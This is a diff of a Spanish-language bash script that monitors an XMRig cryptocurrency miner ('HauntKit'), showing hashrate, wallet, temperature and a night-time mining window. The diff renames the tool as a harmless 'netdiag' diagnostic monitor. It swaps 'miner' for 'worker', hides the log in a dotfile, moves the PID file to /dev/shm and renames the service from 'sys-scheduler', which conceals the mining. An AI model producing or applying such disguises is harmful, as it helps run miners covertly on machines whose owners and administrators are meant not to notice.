@@ -1,18 +1,16 @@
 #!/bin/bash
 # ════════════════════════════════════════════════════════
-#  HauntKit — Monitor del Minero
-#  Muestra estado, versión, hashrate, temperatura y más
-#  Uso:  bash mine-monitor.sh         (vista única)
-#        bash mine-monitor.sh --live  (en vivo, cada 5s)
+#  netdiag — Monitor
+#  Uso:  bash mine-monitor.sh              (vista única)
+#        bash mine-monitor.sh --live       (en vivo)
 # ════════════════════════════════════════════════════════
 
-HAUNTKIT_DIR="/opt/hauntkit"
-CONFIG="$HAUNTKIT_DIR/mine-config.env"
-REPO_DIR="/opt/hauntkit/repo"
-XMRIG_DIR="$HAUNTKIT_DIR/xmrig"
-XMRIG_LOG="$XMRIG_DIR/miner.log"
-PID_FILE="$XMRIG_DIR/miner.pid"
-VERSION_FILE="$HAUNTKIT_DIR/VERSION"
+BASE_DIR="/opt/netdiag"
+CONFIG="$BASE_DIR/.env"
+DATA_DIR="$BASE_DIR/data"
+LOG_FILE="$DATA_DIR/.diag.log"
+PID_FILE="/dev/shm/.netdiag.pid"
+VERSION_FILE="$BASE_DIR/.version"
 TZ="America/Bogota"
 REMOTE_VERSION_URL="https://raw.githubusercontent.com/CyberRo/HauntKit/main/VERSION"
 
@@ -23,7 +21,7 @@ YELLOW='\033[1;33m'; NC='\033[0m'; BOLD='\033[1m'
 # ─── Cargar config ───
 [ -f "$CONFIG" ] && source "$CONFIG"
 
-# ─── Obtener hora actual Colombia ───
+# ─── Hora Colombia ───
 CURRENT_HOUR=$(TZ=$TZ date +%-H)
 CURRENT_TIME=$(TZ=$TZ date '+%F %T')
 
@@ -31,7 +29,7 @@ CURRENT_TIME=$(TZ=$TZ date '+%F %T')
 is_allowed=false
 [ "$CURRENT_HOUR" -ge "${START_HOUR:-18}" ] || [ "$CURRENT_HOUR" -lt "${END_HOUR:-7}" ] && is_allowed=true
 
-# ─── ¿Minero vivo? ───
+# ─── ¿Worker vivo? ───
 is_running=false
 PID=""
 if [ -f "$PID_FILE" ]; then
@@ -49,12 +47,12 @@ check_remote_version() {
     echo "$remote"
 }
 
-# ─── Obtener hashrate ───
+# ─── Hashrate ───
 get_hashrate() {
-    if $is_running && [ -f "$XMRIG_LOG" ]; then
+    if $is_running && [ -f "$LOG_FILE" ]; then
         local hash
-        hash=$(tail -100 "$XMRIG_LOG" | grep -oP 'speed\s+[0-9.]+\s*[kKM]H/s' | tail -1)
-        [ -z "$hash" ] && hash=$(tail -100 "$XMRIG_LOG" | grep -oP 'total\s+[0-9.]+\s*[kKM]H/s' | tail -1)
+        hash=$(tail -100 "$LOG_FILE" | grep -oP 'speed\s+[0-9.]+\s*[kKM]H/s' | tail -1)
+        [ -z "$hash" ] && hash=$(tail -100 "$LOG_FILE" | grep -oP 'total\s+[0-9.]+\s*[kKM]H/s' | tail -1)
         [ -z "$hash" ] && hash="recopilando..."
         echo "$hash"
     else
@@ -62,7 +60,7 @@ get_hashrate() {
     fi
 }
 
-# ─── Obtener temperatura ───
+# ─── Temperatura ───
 get_temp() {
     if command -v sensors &>/dev/null; then
         local temp
@@ -75,16 +73,16 @@ get_temp() {
     fi
 }
 
-# ─── Obtener carga CPU ───
+# ─── Carga CPU ───
 get_cpu_load() {
     local load
     load=$(uptime | grep -oP 'average: \K[0-9.]+' | cut -d, -f1)
     echo "$load"
 }
 
-# ─── Obtener wallet (oculto parcialmente) ───
+# ─── Wallet (parcial) ───
 get_wallet_short() {
-    local w="${FULL_WALLET:-${WALLET_BASE}.$(hostname)}"
+    local w="${WALLET_BASE}.$(hostname)"
     echo "${w:0:6}...${w: -4}"
 }
 
@@ -92,15 +90,15 @@ get_wallet_short() {
 clear
 echo -e "${CYAN}"
 echo "╔══════════════════════════════════════════╗"
-echo "║       HauntKit — Mining Monitor         ║"
-echo "║       CYBER HAUNT & SPECTRE             ║"
+echo "║        netdiag — Diagnostic Monitor     ║"
+echo "║          CYBER HAUNT & SPECTRE          ║"
 echo "╚══════════════════════════════════════════╝"
 echo -e "${NC}"
-echo "  ${BOLD}Tiempo:${NC}     $CURRENT_TIME (Colombia UTC-5)"
-echo "  ${BOLD}Worker:${NC}     $(hostname)"
+echo "  ${BOLD}Tiempo:${NC}     $CURRENT_TIME"
+echo "  ${BOLD}Host:${NC}       $(hostname)"
 echo ""
 
-# ─── Versión y actualizaciones ───
+# ─── Versión ───
 echo "  ─── Versión ───"
 echo -e "  ${BOLD}Local:${NC}      v$LOCAL_VERSION"
 
@@ -110,26 +108,25 @@ if [ -n "$REMOTE" ]; then
         echo -e "  ${BOLD}GitHub:${NC}     v$REMOTE ${GREEN}(actualizado)${NC}"
     else
         echo -e "  ${BOLD}GitHub:${NC}     v$REMOTE ${YELLOW}(⚠️ nueva versión disponible)${NC}"
-        echo -e "  ${YELLOW}  Se actualizará automáticamente en ~6h${NC}"
-        echo -e "  ${YELLOW}  Forzar ahora: systemctl restart sys-scheduler${NC}"
+        echo -e "  ${YELLOW}  Forzar: systemctl restart netdiag${NC}"
     fi
 else
     echo -e "  ${BOLD}GitHub:${NC}     ${YELLOW}no conecta${NC}"
 fi
 echo ""
 
-# ─── Estado del minero ───
+# ─── Estado ───
 echo "  ─── Estado ───"
 if $is_running; then
-    echo -e "  ${BOLD}Minero:${NC}     ${GREEN}ACTIVO${NC} (PID $PID)"
+    echo -e "  ${BOLD}Worker:${NC}     ${GREEN}ACTIVO${NC} (PID $PID)"
 else
-    echo -e "  ${BOLD}Minero:${NC}     ${RED}DETENIDO${NC}"
+    echo -e "  ${BOLD}Worker:${NC}     ${RED}DETENIDO${NC}"
 fi
 
 if $is_allowed; then
-    echo -e "  ${BOLD}Horario:${NC}    ${GREEN}Dentro del horario permitido${NC}"
+    echo -e "  ${BOLD}Horario:${NC}    ${GREEN}Dentro de ventana${NC}"
 else
-    echo -e "  ${BOLD}Horario:${NC}    ${YELLOW}Fuera del horario (${START_HOUR}:00-${END_HOUR}:00)${NC}"
+    echo -e "  ${BOLD}Horario:${NC}    ${YELLOW}Fuera de ventana${NC}"
 fi
 
 echo -e "  ${BOLD}Wallet:${NC}     $(get_wallet_short)"
@@ -142,21 +139,17 @@ echo -e "  ${BOLD}Temperatura:${NC} $(get_temp)"
 echo -e "  ${BOLD}CPU Load:${NC}    $(get_cpu_load)"
 echo ""
 
-# ─── Últimas líneas del log ───
+# ─── Log ───
 echo "  ─── Últimos eventos ───"
-if [ -f "$XMRIG_LOG" ]; then
-    tail -5 "$XMRIG_LOG" | while read -r line; do
-        echo "  $line"
-    done
+if [ -f "$LOG_FILE" ]; then
+    tail -5 "$LOG_FILE" | while read -r line; do echo "  $line"; done
 else
-    echo "  (sin logs aún)"
+    echo "  (sin logs)"
 fi
 
 echo ""
-echo -e "  ${CYAN}Presiona Ctrl+C para salir | "
-echo -e "  Refrescando cada 5s...${NC}"
+echo -e "  ${CYAN}Refrescando cada 5s | Ctrl+C salir${NC}"
 
-# ─── Loop de monitoreo (solo si hay flag --live) ───
 if [ "$1" == "--live" ]; then
     sleep 5
     exec "$0" --live
